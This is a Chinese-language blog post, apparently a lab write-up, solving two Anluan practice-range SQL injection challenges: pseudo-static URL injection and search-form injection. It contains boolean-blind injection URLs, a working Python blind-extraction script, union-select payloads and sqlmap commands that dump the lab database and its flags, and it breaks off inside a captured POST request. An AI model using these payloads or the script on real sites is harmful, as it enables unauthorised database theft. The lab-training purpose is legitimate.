<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="涂寐"><title>安鸾之SQL系列&amp;余下部分 | 涂寐&#39;s Blogs</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!1,init_open:!0},style:{primary_color:"#0066cc",logo:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",favicon:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",avatar:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",font_size:"18px",font_family:"STKaiti, STSong, STHeiti",hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"现在的你不努力||未来的你·该有多狼狈",font_color:null,hitokoto:!1},scroll:{progress_bar:!0,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"default"},side_tools:{},pjax:{enable:!0},lazyload:{enable:!0},comment:{enable:!0,use:"valine",valine:{appid:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appkey:"C0Wy6Sfq0qVag0nm59fc1D12",placeholder:"道友，请留步！请留言~"},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null},twikoo:{env_id:null,region:null,version:"1.6.7"},waline:{server_url:null,reaction:!1,version:2}},post:{author_label:{enable:!0,auto:!0,custom_label_list:["涂寐"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"center",copyright_info:!0},version:"3.5.2"},KEEP.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},KEEP.language_code_block={copy:"复制代码",copied:"已复制",fold:"折叠代码块",folded:"已折叠"}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span> <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"> </a><a class="logo-title" href="/">涂寐&#39;s Blogs</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">首页</a></li><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/tags">标签</a></li><li class="menu-item"><a href="/categories">分类</a></li><li class="menu-item"><a href="/links">友链</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">首页</a></li><li class="drawer-menu-item flex-center"><a href="/archives">归档</a></li><li class="drawer-menu-item flex-center"><a href="/tags">标签</a></li><li class="drawer-menu-item flex-center"><a href="/categories">分类</a></li><li class="drawer-menu-item flex-center"><a href="/links">友链</a></li><li class="drawer-menu-item flex-center"><a href="/about">关于</a></li></ul></div><div class="window-mask"></div><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"JiZItHVhLKBShkL0",ck:"JiZItHVhLKBShkL0"})</script></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">安鸾之SQL系列&amp;余下部分</span></div><div class="article-header"><div class="avatar"><img src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"></div><div class="info"><div class="author"><span class="name">涂寐</span> <span class="author-label">Lv4</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-06-13 08:38:26</span> <span class="mobile">2022-06-13 08:38</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2022-06-13 09:35:12</span> </span><span class="article-categories article-meta-item"><i class="fas fa-folder"></i>&nbsp;<ul><li><a href="/categories/targettange/">靶场</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/whalwl/">安鸾</a>&nbsp;</li><li>| <a href="/tags/sql/">SQL</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h1 id="0x00-开题说明"><a href="#0x00-开题说明" class="headerlink" title="0x00 开题说明"></a>0x00 开题说明</h1><blockquote><p>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及<br>盈利等目的，否则后果自行承担！<br>本文首发于涂寐’s Blogs：<a class="link" target="_blank" rel="noopener" href="https://0xtlu.github.io/">https://0xtlu.github.io<i class="fas fa-external-link-alt"></i></a></p></blockquote><h1 id="0x01-伪静态-amp-搜索注入"><a href="#0x01-伪静态-amp-搜索注入" class="headerlink" title="0x01 伪静态&amp;搜索注入"></a>0x01 伪静态&amp;搜索注入</h1><h2 id="0o00-题目提示"><a href="#0o00-题目提示" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">伪静态&amp;搜索注入</span><br><span class="line"></span><br><span class="line">题目URL：http://47.103.94.191:8001/</span><br></pre></td></tr></table></figure><h2 id="0o01-伪静态注入"><a href="#0o01-伪静态注入" class="headerlink" title="0o01 伪静态注入"></a>0o01 伪静态注入</h2><p>①网站形态：分动态和静态。<br>②动态页面：一个页面根据用户请求，从服务器数据库中筛选出请求的内容并返回前端界面。<br>③静态页面：用户访问一个页面，服务器直接将该页面返回前端界面，无需数据库支持。<br>④伪静态页面：动态页面为提高收录率，通过某些规则将动态页面的地址转换成以 htm&#x2F;html 后缀的形式（重写URL），但本质上仍为动态页面。<br>⑤个人理解伪静态图：<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumei%E4%BC%AA%E9%9D%99%E6%80%81.znow7iyumww.jpg" alt="tumei伪静态"></p><p>⑥伪静态判定</p><ol><li>利用<code>动态页面最后修改时间总为当前时间，静态页面最后修改时间为文件生成时间</code>的特点进行判定</li><li>流程：htm页面–&gt;F12–&gt;控制台–&gt;输入<code>javascript:alert(document.lastModified)</code>–&gt;日期总为当前时间，为伪静态。<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.27v9hqelq7gg.jpg" alt="tumeiimage"></li></ol><p>⑦常见伪静态：aspcms、phpweb、thinkphp框架等</p><h2 id="0o02-利用过程"><a href="#0o02-利用过程" class="headerlink" title="0o02 利用过程"></a>0o02 利用过程</h2><ol><li><p>纯手工利用<br>①判断可能存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.94.191:8001/front/articles-1 and 1=1.html	<span class="comment"># 正常响应</span></span><br><span class="line">http://47.103.94.191:8001/front/articles-1 and 1=2.html	<span class="comment"># 异常响应</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪静态中使用%20，%23，+等字符时会直接传递到URL中，但可使用块注释 /**/ 来代替空格</span></span><br><span class="line"><span class="comment"># 可知当前URL所请求表中含７个字段，通过sqlmap可进一步确认（news库news表）</span></span><br><span class="line">http://47.103.94.191:8001/front/articles-2/**/order/**/by/**/7.html</span><br><span class="line">http://47.103.94.191:8001/front/articles-2/**/order/**/by/**/8.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔注入</span></span><br><span class="line"><span class="comment"># 当 1-true 成立，即为0，则没有文章articles-0，反之为文章articles-1</span></span><br><span class="line">http://47.103.94.191:8001/front/articles-1-true.html</span><br><span class="line">http://47.103.94.191:8001/front/articles-1-false.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前用户名长度</span></span><br><span class="line"><span class="comment"># 当 length(user())=13 成立（true），则 2-(length(user())=13) 得1，则显示文章articles-1，反之显示文章articles-2</span></span><br><span class="line"><span class="comment"># 又，通过 sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch -v 3 --current-user 得用户名，test@localhost</span></span><br><span class="line"><span class="comment"># 故，可以确定当前用户连接用户名长度为14，注入语句成功</span></span><br><span class="line">http://47.103.94.191:8001/front/articles-2-(length(user())=13).html</span><br><span class="line">http://47.103.94.191:8001/front/articles-2-(length(user())=14).html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前数据库名长度</span></span><br><span class="line">http://47.103.94.191:8001/front/articles-1-(length(database())=3).html</span><br><span class="line">http://47.103.94.191:8001/front/articles-1-(length(database())=4).html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://47.103.94.191:8001/front/articles-1.html		<span class="comment"># 未加入单引号</span></span><br><span class="line">http://47.103.94.191:8001/front/articles-1<span class="string">&#x27;.html	# 加入单引号,出现异常响应</span></span><br></pre></td></tr></table></figure><p>②发现没有回显，写脚本进行盲注<br>这里脚本可以试试二分法进行盲注，可以有效降低时间复杂度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> requests.sessions <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Time    : 2022/5/9 19:18</span></span><br><span class="line"><span class="string">@Author  : 涂寐</span></span><br><span class="line"><span class="string">@File    : d.py</span></span><br><span class="line"><span class="string">@PRODUCT : PyCharm</span></span><br><span class="line"><span class="string">@Description : 用于盲注 http://47.103.94.191:8001/front/articles-1%20AND%20(substring(database(),1,1)=&#x27;1&#x27;).html 的脚本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Riddle</span>:</span><br><span class="line">    url = <span class="string">&quot;http://47.103.94.191:8001/front/articles-1&#123;&#125;.html&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55 &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    estimates = <span class="string">&quot;abcdefghigklmnopqrstuvwxyz0123456789@_.,&#123;&#125;!#^*()-+/+&amp;~=%$&quot;</span></span><br><span class="line">    re_title = <span class="string">r&#x27;&lt;h1.*?&gt;(.*?)&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">riddle_request</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        这是一个网络请求函数</span></span><br><span class="line"><span class="string">        :param url: 待请求注入的网址</span></span><br><span class="line"><span class="string">        :return: 存在注入的判定标识</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> session().get(url=url, headers=self.headers) <span class="keyword">as</span> response:</span><br><span class="line">            content = response.text</span><br><span class="line">            title_list = re.findall(self.re_title, <span class="built_in">str</span>(content))</span><br><span class="line">            <span class="keyword">return</span> title_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">riddle_length</span>(<span class="params">self, sql_syntax: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        这是一个求取sql请求返回值长度的函数，主要使用还是看你的思维</span></span><br><span class="line"><span class="string">        :param sql_syntax: sql注入语句</span></span><br><span class="line"><span class="string">        :return: sql语句返回值的长度</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1024</span>):</span><br><span class="line">            url = self.url.<span class="built_in">format</span>(sql_syntax).<span class="built_in">format</span>(num=num)</span><br><span class="line">            <span class="built_in">print</span>(num, end=<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.riddle_request(url):</span><br><span class="line">                <span class="built_in">print</span>(num)</span><br><span class="line">                <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">riddle_estimate</span>(<span class="params">self, length: <span class="built_in">int</span>, sql_syntax: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        这是一个猜想sql请求返回具体内容的函数，主要使用还是看你的思维</span></span><br><span class="line"><span class="string">        :param length: 猜想长度</span></span><br><span class="line"><span class="string">        :param sql_syntax: sql语句</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> estimate <span class="keyword">in</span> self.estimates:</span><br><span class="line">                url = self.url.<span class="built_in">format</span>(sql_syntax).<span class="built_in">format</span>(num=num, estimate=estimate)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> self.riddle_request(url):</span><br><span class="line">                    <span class="built_in">print</span>(estimate, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    sleep(<span class="number">1</span>)</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 避免过多请求</span></span><br><span class="line">            <span class="keyword">if</span> flag &gt; <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag大于3&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 猜表名</span></span><br><span class="line">    <span class="comment"># column_name = &quot;table_name&quot;</span></span><br><span class="line">    <span class="comment"># table_name = &quot;information_schema.columns&quot;</span></span><br><span class="line">    <span class="comment"># limit_name = &quot;table_schema&quot;</span></span><br><span class="line">    <span class="comment"># appoint_name = &quot;news&quot;</span></span><br><span class="line">    <span class="comment"># 猜字段</span></span><br><span class="line">    <span class="comment"># column_name = &quot;column_name&quot;</span></span><br><span class="line">    <span class="comment"># table_name = &quot;information_schema.columns&quot;</span></span><br><span class="line">    <span class="comment"># limit_name = &quot;table_name&quot;</span></span><br><span class="line">    <span class="comment"># appoint_name = &quot;flag_is_here&quot;</span></span><br><span class="line">    <span class="comment"># 猜字段值</span></span><br><span class="line">    column_name = <span class="string">&quot;flag_number&quot;</span></span><br><span class="line">    table_name = <span class="string">&quot;news.flag_is_here&quot;</span></span><br><span class="line">    limit_name = <span class="string">&quot;fid&quot;</span></span><br><span class="line">    appoint_name = <span class="string">&quot;1&quot;</span></span><br><span class="line">    riddle = Riddle()</span><br><span class="line">    <span class="comment"># http://47.103.94.191:8001/front/articles-1 and ((select length(group_concat(distinct table_schema)) from</span></span><br><span class="line">    <span class="comment"># information_schema.tables)=29).html</span></span><br><span class="line">    riddle_length = riddle.riddle_length(</span><br><span class="line">        sql_syntax=<span class="string">&quot; and ((select length(group_concat(distinct &#123;column_name&#125;)) from &#123;table_name&#125; where &#123;limit_name&#125;=&#x27;&#123;appoint_name&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            column_name=column_name, table_name=table_name, limit_name=limit_name,</span><br><span class="line">            appoint_name=appoint_name) + <span class="string">&quot;)=&#123;num&#125;)&quot;</span>)</span><br><span class="line">    <span class="comment"># http://47.103.94.191:8001/front/articles-1 and (substring((select group_concat(distinct table_schema) from</span></span><br><span class="line">    <span class="comment"># information_schema.tables),1,1)=&#x27;i&#x27;).html</span></span><br><span class="line">    riddle.riddle_estimate(</span><br><span class="line">        sql_syntax=<span class="string">r&quot; and (substring((select group_concat(distinct &#123;column_name&#125;) from &#123;table_name&#125; where &#123;limit_name&#125;=&#x27;&#123;appoint_name&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            column_name=column_name, table_name=table_name, limit_name=limit_name,</span><br><span class="line">            appoint_name=appoint_name) + <span class="string">&quot;),&#123;num&#125;,1)=&#x27;&#123;estimate&#125;&#x27;)&quot;</span>, length=riddle_length)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.7gd7evmhfxs0.jpg" alt="tumeiimage"></p></li><li><p>sqlmap利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注！！！注！！！注！！！</span></span><br><span class="line"><span class="comment"># sqlmap一把梭时，可在存在伪静态注入点后加入 * 符号标识，具体如下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前使用的库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8001/front/articles-1*.html&quot;</span> --batch  –-current-db</span><br><span class="line"><span class="comment"># 爆news库下表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8001/front/articles-1*.html&quot;</span> --batch -D <span class="string">&quot;news&quot;</span> --tables</span><br><span class="line"><span class="comment"># 爆news库flag_is_here表下字段名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8001/front/articles-1*.html&quot;</span> --batch -D <span class="string">&quot;news&quot;</span> -T <span class="string">&#x27;flag_is_here&#x27;</span> --columns</span><br><span class="line"><span class="comment"># 爆news库flag_is_here表fid和flag_number字段内容</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8001/front/articles-1*.html&quot;</span> --batch -D <span class="string">&quot;news&quot;</span> -T <span class="string">&#x27;flag_is_here&#x27;</span> -C <span class="string">&#x27;fid,flag_number&#x27;</span> --dump</span><br><span class="line"><span class="comment"># 最终得到</span></span><br><span class="line">flag&#123;c681ed59dd48ac30bfe913a4c73b2aaa&#125; </span><br><span class="line"><span class="comment"># 注：使用 -v 参数设置sqlmap的回显等级， -v 为 3 时恰好显示注入语句</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8001/front/articles-1*.html&quot;</span> --batch -v 3</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.5421wojolds0.jpg" alt="tumeiimage"></p></li></ol><h1 id="0x02-SQL搜索型注入01"><a href="#0x02-SQL搜索型注入01" class="headerlink" title="0x02 SQL搜索型注入01"></a>0x02 SQL搜索型注入01</h1><h2 id="0o00-题目提示-1"><a href="#0o00-题目提示-1" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL搜索型注入01</span><br><span class="line"></span><br><span class="line">漏洞URL:http://<span class="number">47.103</span><span class="number">.94</span><span class="number">.191</span>:<span class="number">8002</span>/search.php</span><br><span class="line"></span><br><span class="line">提示:flag在数据库里</span><br></pre></td></tr></table></figure><h2 id="0o01-利用过程"><a href="#0o01-利用过程" class="headerlink" title="0o01 利用过程"></a>0o01 利用过程</h2><ol><li><p>直接搜索框测试，注入点无法查看，使用 HackBar 获取post内容。<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.65s2gtuvpzk0.jpg" alt="tumeiimage"></p></li><li><p>显而易见的注入点，现在构造你的语句吧<br>① 传递查询参数<code>1</code>时，通过POST传参 <code>search=1</code> ，查询数据库中某字段中（返回到前端的<code>Message</code>列）含<code>1</code>的内容，猜测SQL语句类似<code>select column1,column2,column3 from table where like &#39;%$&#123;parameter&#125;%&#39;</code>。<br>② 通过修改<code>search=1&#39; order by 5#</code>中的<code>5</code>判断注入语句中的字段个数，此处为5。<br>③ 通过构造<code>union</code>子句检测查询内容回显在前端的哪个位置<code>search 1&#39; union select 1,2,3,4,5#</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search=1<span class="string">&#x27; union select 1,2,group_concat(distinct table_name),4,5  from information_schema.columns where table_schema like database()%23</span></span><br><span class="line"><span class="string">得到：	account,caffaine,dwvs_admin_message,dwvs_message,dwvs_user_message,dwvs_vulnerability,flag,news,user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">search=1&#x27;</span> union select 1,2,group_concat(distinct column_name),4,5 from information_schema.columns <span class="built_in">where</span> table_name like <span class="string">&#x27;flag&#x27;</span>%23</span><br><span class="line">得到：	<span class="built_in">id</span>,flag</span><br><span class="line"></span><br><span class="line">search=1<span class="string">&#x27; union select 1,2,group_concat(distinct flag),4,5  from flag%23</span></span><br><span class="line"><span class="string">得到：flag&#123;8bce2844bc098845261fad79a3a56215&#125;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.75i3ujj1gfw0.jpg" alt="tumeiimage"></p></li><li><p>sqlmap测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 --data 参数指定提交的post数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8002/search.php&quot;</span> --batch --data <span class="string">&quot;search=1&quot;</span> -D <span class="string">&#x27;dwvs&#x27;</span> -T <span class="string">&#x27;flag&#x27;</span> -C <span class="string">&#x27;id,flag&#x27;</span> --dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 -r 参数指定post请求包</span></span><br><span class="line">sqlmap -r ./post.txt -D <span class="string">&#x27;dwvs&#x27;</span> -T <span class="string">&#x27;flag&#x27;</span> -C <span class="string">&#x27;flag&#x27;</span> --dump</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8002</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.103.94.191:8002</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.103.94.191:8002/search.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>security_level=1; PHPSESSID=2ge1634i8bqs8o9g1nsebvsvk2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">search</span><span 